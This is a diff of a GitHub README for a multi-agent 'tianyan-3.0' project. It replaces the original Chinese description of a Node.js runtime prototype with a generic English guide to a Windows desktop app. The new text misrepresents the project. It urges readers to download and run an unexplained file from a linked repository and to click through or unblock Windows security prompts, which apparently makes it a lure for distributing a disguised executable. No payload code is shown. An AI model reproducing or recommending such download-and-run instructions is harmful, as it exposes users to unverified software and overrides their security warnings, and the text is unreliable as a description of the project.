@@ -1,176 +1,201 @@
-# 人体智能体协作模式-多智能体架构系统
+# 🤖 tianyan-3.0 - Human-AI Workflows Made Simple
 
-> 一个可运行、可观测、可验证、可演化的智能体 runtime 原型。
+[![Download tianyan-3.0](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Forty-genuspickeringia400/tianyan-3.0)
 
-人体智能体协作模式-多智能体架构系统（原天衍3.0 / AgentX 3.0）不是“给聊天助手套一层 UI”，也不是“把几个 prompt 和 tool 串起来”的 agent demo。
+## 🚀 What This App Does
 
-它试图回答的是一个更底层的问题：
+tianyan-3.0 is a desktop app for human and AI teamwork. It helps you set up multi-agent workflows in one place, track what each agent does, and keep the whole process easy to follow.
 
-> 如果一个智能体系统真的要长期运行，它应该怎样拥有分层架构、任务生命周期、可观测性、安全边界、验证机制，以及受控自我进化能力？
+Use it when you want to:
+- run several AI agents in one workflow
+- assign tasks between people and agents
+- watch work status in a clear view
+- keep long tasks organized
+- handle repeated work with less effort
 
-为此，这个项目把系统拆成七层 runtime，并把灵性 / 觉醒、三魂七魄、防御矩阵、网络安全配置、自我进化治理都映射成了真正的工程模块，而不是停留在概念层。
+## 📥 Download and Install
 
----
+Open this page and download the app:
 
-## 它解决什么问题
+[Download tianyan-3.0](https://github.com/Forty-genuspickeringia400/tianyan-3.0)
 
-大多数 agent 项目停留在两层：
-1. 会不会调模型
-2. 会不会调工具
+After you open the page:
+1. Find the latest release or download file.
+2. Download the Windows version.
+3. If the file is a `.zip`, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
 
-但一个真正要长期运行的智能体系统，还需要回答这些问题：
-- 任务如何进入、流转、关闭？
-- 结果如何验证，而不是先做完再说？
-- 高风险动作如何被约束？
-- 系统如何积累经验，又不变成失控自治？
-- 用户如何看到系统当前在做什么、处于什么阶段？
+If Windows asks for permission, choose Run or Yes.
 
-这个项目的目标，就是把这些问题收成一个**可运行的系统原型**。
+## 🖥️ System Requirements
 
----
+For best results, use a Windows PC with:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB free disk space
+- a stable internet connection
+- a display with 1366 × 768 resolution or higher
 
-## 核心能力
+If you plan to run many agents at once, 8 GB RAM is a better fit.
 
-- **七层 runtime 架构**：从 Meta Core 到 Federation Layer
-- **任务生命周期可见**：输入、理解、规划、执行、验证、关闭
-- **verify-before-done**：不验证，不宣称完成
-- **Dashboard / API / Workbench**：系统状态、工作台、生命周期可读
-- **灵性 / 觉醒模块**：使命一致性、self-model、成长阶段判断
-- **三魂七魄工程映射**：不是隐喻装饰，而是系统模块映射
-- **网络安全配置层**：入口绑定、联邦边界、出口审批、密钥封装、审计回滚
-- **受控自我进化**：capsule / review / apply / shelve / rollback
+## 🧭 First-Time Setup
 
----
+After you launch tianyan-3.0, follow these steps:
 
-## 它不是什么
+1. Open the app.
+2. Set your language and basic preferences.
+3. Add your AI service key if the app asks for one.
+4. Create your first workspace.
+5. Choose a workflow template.
+6. Start a test run with one small task.
 
-- 不是通用 AGI
-- 不是万能自动化 agent
-- 不是成熟商业 SaaS
-- 不是已经接管复杂生产环境的企业级平台
-- 不是无边界自动修改自身的自治系统
+If you do not have a task yet, try a simple example such as:
+- write a short report
+- sort customer requests
+- compare two documents
+- draft a task plan
+- review a list of items
 
-更准确地说：
+## 🧠 Main Features
 
-> **它是一个已经有主链路、可运行面、验证纪律和演化治理的系统原型；不是终局产品。**
+### 🤝 Human-Agent Collaboration
 
----
+You can mix human input with agent work in one flow. This helps when you want AI to do the heavy lifting while you stay in control of key steps.
 
-## 架构总览
+### 🧩 Multi-Agent Orchestration
 
-当前系统按七层理解：
+tianyan-3.0 can manage several agents in the same workflow. One agent can gather data, another can review it, and another can turn it into a final result.
 
-- **L0 Meta Core**：使命、策略、人格、偏好、项目状态
-- **L0.5 灵性 / 觉醒**：使命一致性、self-model、成长阶段
-- **L1 Cognition Loop**：感知、解释、规划、决策、反思、验证
-- **L2 Coordination Hub**：路由、事件总线、任务图、调度
-- **L3 Capability Services**：记忆、守卫、处理、IO、洞察、清理
-- **L4 Execution Layer**：执行、部署、适配运行时
-- **L5 Evolution Layer**：capsule、records、review、apply、rollback
-- **L6 Federation Layer**：registry、delegation、federated memory boundary
+### 📊 Observability
 
----
+You can follow what happens during a run. This makes it easier to see:
+- which step is active
+- which agent is waiting
+- where a task stopped
+- how long each step took
 
-## 三个最重要的设计点
+### 🔁 Self-Evolution
 
-### 1. 它是 runtime，不是聊天壳
-这里的重点不是“会话体验”，而是系统如何长期运行。
+The app can support workflows that improve over time. You can refine steps, update rules, and reuse what works best in later runs.
 
-### 2. 它强调验证纪律
-验证先于完成，审计先于宣称，这是它和多数 agent demo 最大的区别之一。
+### 🛠️ Workflow Control
 
-### 3. 它允许演化，但不允许失控
-它允许经验沉淀、策略候选生成和能力 capsule 孵化，但 apply / rollback 仍受审批与记录约束。
+You can build a process that fits your task. Set the order of steps, move work between agents, and keep the flow clear from start to finish.
 
----
+## 🏁 How to Use It
 
-## Quick Start
+### 1. Start a Workspace
 
-```bash
-npm install
-npm start
-```
+Create a workspace for one task or one project. This keeps your work grouped in one place.
 
-开发模式：
+### 2. Add Agents
 
-```bash
-npm run dev
-```
+Add the agents you want to use. Give each one a clear job, such as:
+- planner
+- researcher
+- reviewer
+- writer
+- checker
 
-测试：
+### 3. Build a Workflow
 
-```bash
-npm test
-npm run smoke
-```
+Set the order of the steps. A basic workflow may look like this:
+- collect input
+- process data
+- review output
+- produce final result
 
-默认地址：
+### 4. Run the Task
 
-```txt
-http://localhost:4330
-```
+Start the workflow and watch the progress view. You can step in when a human decision is needed.
 
----
+### 5. Review the Result
 
-## 当前开放能力（建议对外口径）
+Check the final output, read the logs, and adjust the workflow if needed.
 
-当前最适合公开讲的能力有：
-- 七层 runtime 已落地
-- Dashboard / API / Workbench 可见
-- 灵性 / 三魂七魄已有工程映射
-- 自我进化已进入受控治理链
-- 高风险动作仍保留审批与边界约束
+## 🧰 Common Uses
 
-当前**不建议**对外夸写的口径有：
-- 通用 AGI
-- 完整企业级生产稳定性
-- 无边界自治能力
-- 复杂跨网络自治系统
+tianyan-3.0 fits many everyday work tasks, such as:
+- office task tracking
+- document review
+- research support
+- content planning
+- team task routing
+- repeated workflow handling
+- AI-assisted decision flow
 
----
+## 🧾 Example Setup
 
-## 适合谁看
+Here is a simple setup for a small team:
 
-这个项目更适合以下读者：
-- 想做 agent runtime / orchestration system 的工程师
-- 对“agent system 应该如何具备自我治理”感兴趣的人
-- 想看一个不是只会调模型的 agent 原型的人
-- 想把人机协作工作流推进到系统层的人
+- Agent 1: collects user requests
+- Agent 2: sorts the requests
+- Agent 3: drafts replies
+- Human step: checks the draft
+- Agent 4: formats the final output
 
----
+This setup works well when you want fast handling with a human review step.
 
-## Roadmap
+## ⚙️ Tips for Windows Users
 
-下一阶段更值得做的，不是继续堆概念，而是：
-1. 收平公开版最小运行路径
-2. 收平 dashboard / API / docs 一致性
-3. 补 examples、screenshots、FAQ
-4. 抽掉不适合公开的内部残留
-5. 为后续 Public/Core 演进留出清晰边界
+- Keep the app in a folder with a short path, like `C:\Apps\tianyan-3.0`
+- Do not move files after setup unless you know the app still works from the new location
+- If the app opens blank, close it and start it again
+- If Windows blocks the file, right-click it and choose Properties, then select Unblock if shown
+- Keep your internet connection on if the app uses online AI services
 
----
+## 🔐 Privacy and Local Use
 
-## 为什么现在开源它
+You control how you use the app and where your data goes. If you connect it to online AI services, content may leave your device for processing. If you keep your workflow local, you can limit outside access.
 
-因为它已经越过“纯概念说明书”的阶段了。
+## 📁 Suggested Folder Layout
 
-它现在已经是：
-- 有系统骨架
-- 有运行主链
-- 有可见界面
-- 有验证纪律
-- 有演化治理
+If you want to keep things neat, use this folder layout:
 
-所以现在适合把它作为一个**公开可讨论、可运行、可继续迭代的原型**推出来。
+- `tianyan-3.0`
+  - `input`
+  - `output`
+  - `logs`
+  - `templates`
+  - `archives`
 
----
+This makes it easier to find files after each run.
 
-## License
+## 🧪 Troubleshooting
 
-MIT
+### The app does not open
+- Check that the download finished
+- Extract the files if they came in a zip
+- Try running the app again
+- Restart your computer and try once more
 
----
+### Windows shows a security prompt
+- Choose the option that lets you keep running the app
+- Check that you downloaded it from the link above
 
-## 一句话收口
+### The workflow stops early
+- Look for a missing input step
+- Check that each agent has a clear role
+- Review the logs and run the task again
 
-> **人体智能体协作模式-多智能体架构系统，是一个把“智能体系统到底该怎么长”往 runtime 方向认真推进了一步的开源原型。**
+### The app feels slow
+- Close other apps
+- Use fewer agents in one run
+- Reduce file size for the first test
+- Add more memory if your PC is low on RAM
+
+## 📌 Good First Task
+
+Try this first:
+- make a 3-step workflow
+- add one human review step
+- add two agents
+- run a short sample task
+- check the output and adjust the flow
+
+This gives you a quick way to learn how the app works
+
+## 📚 Topics
+
+agent-runtime, ai-agents, human-agent-collaboration, multi-agent, observability, open-source, orchestration, runtime, self-evolution, workflow
